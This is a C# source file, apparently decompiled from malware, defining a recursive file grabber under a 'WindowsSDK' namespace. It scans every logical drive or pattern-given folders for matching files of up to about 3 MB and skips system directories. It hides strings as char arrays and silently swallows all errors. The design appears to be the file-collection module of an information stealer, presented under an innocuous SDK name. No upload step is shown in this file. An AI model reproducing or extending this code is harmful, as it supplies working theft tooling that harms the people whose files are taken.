using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using WindowsSDK.Objects.Info;

namespace WindowsSDK.Data.Files
{
    public static class RecoursiveFileGrabber
    {
        public static List<ScannedFile> Scan(IEnumerable<string> patterns)
        {
            List<ScannedFile> list = new List<ScannedFile>();
            try
            {
                foreach (string pattern in patterns)
                {
                    try
                    {
                        string[] array = pattern.Split(new string[1] { "|" }, StringSplitOptions.RemoveEmptyEntries);
                        if (array == null || array.Length <= 2)
                        {
                            continue;
                        }
                        string text = Environment.ExpandEnvironmentVariables(array[0]);
                        string[] searchPatterns = array[1].Split(new string[1] { "," }, StringSplitOptions.RemoveEmptyEntries);
                        string value = array[2];
                        long result = 3097152L;
                        if (array != null && array.Length == 4)
                        {
                            long.TryParse(array[3], out result);
                        }
                        if (text == new string(new char[8] { '%', 'D', 'S', 'K', '_', '2', '3', '%' }))
                        {
                            string[] logicalDrives = Environment.GetLogicalDrives();
                            foreach (string rootPath in logicalDrives)
                            {
                                try
                                {
                                    foreach (string file in GetFiles(rootPath, (SearchOption)Convert.ToInt32(value), searchPatterns))
                                    {
                                        try
                                        {
                                            FileInfo fileInfo = new FileInfo(file);
                                            if (fileInfo.Length > 0 && fileInfo.Length <= result)
                                            {
                                                string[] array2 = fileInfo.Directory.FullName.Split(new string[1]
                                                {
                                                    new string(new char[2] { ':', '\\' })
                                                }, StringSplitOptions.RemoveEmptyEntries);
                                                list.Add(new ScannedFile(fileInfo.FullName)
                                                {
                                                    DirOfFile = ((array2 != null && array2.Length > 1) ? array2[1] : string.Empty),
                                                    PathOfFile = file
                                                });
                                            }
                                        }
                                        catch
                                        {
                                        }
                                    }
                                }
                                catch
                                {
                                }
                            }
                            continue;
                        }
                        foreach (string file2 in GetFiles(text, (SearchOption)Convert.ToInt32(value), searchPatterns))
                        {
                            try
                            {
                                FileInfo fileInfo2 = new FileInfo(file2);
                                if (fileInfo2.Length > 0 && fileInfo2.Length <= result)
                                {
                                    string[] array3 = fileInfo2.Directory.FullName.Split(new string[1]
                                    {
                                        new string(new char[2] { ':', '\\' })
                                    }, StringSplitOptions.RemoveEmptyEntries);
                                    list.Add(new ScannedFile(fileInfo2.FullName)
                                    {
                                        DirOfFile = ((array3 != null && array3.Length > 1) ? array3[1] : string.Empty),
                                        PathOfFile = file2
                                    });
                                }
                            }
                            catch (Exception)
                            {
                            }
                        }
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch
            {
            }
            return list;
        }

        public static IEnumerable<string> GetFiles(string rootPath, SearchOption searchOption, string[] searchPatterns)
        {
            List<string> list = new List<string>
            {
                new string(new char[9] { '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\' }),
                new string(new char[15]
            {
                '\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'F',
                'i', 'l', 'e', 's', '\\'
            }),
                new string(new char[21]
            {
                '\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'F',
                'i', 'l', 'e', 's', ' ', '(', 'x', '8', '6', ')',
                '\\'
            }),
                new string(new char[14]
            {
                '\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'D',
                'a', 't', 'a', '\\'
            })
            };
            IEnumerable<string> enumerable = Enumerable.Empty<string>();
            if (searchOption == SearchOption.AllDirectories)
            {
                try
                {
                    foreach (string item in (IEnumerable<string>)Directory.GetDirectories(rootPath))
                    {
                        if (list != null && list.Any())
                        {
                            bool flag = false;
                            foreach (string item2 in list)
                            {
                                if (item.Contains(item2))
                                {
                                    flag = true;
                                    break;
                                }
                            }
                            if (flag)
                            {
                                continue;
                            }
                        }
                        enumerable = enumerable.Concat(GetFiles(item, searchOption, searchPatterns));
                    }
                }
                catch
                {
                }
            }
            foreach (string searchPattern in searchPatterns)
            {
                try
                {
                    enumerable = enumerable.Concat(Directory.EnumerateFiles(rootPath, searchPattern));
                }
                catch
                {
                }
            }
            return enumerable;
        }
    }
}
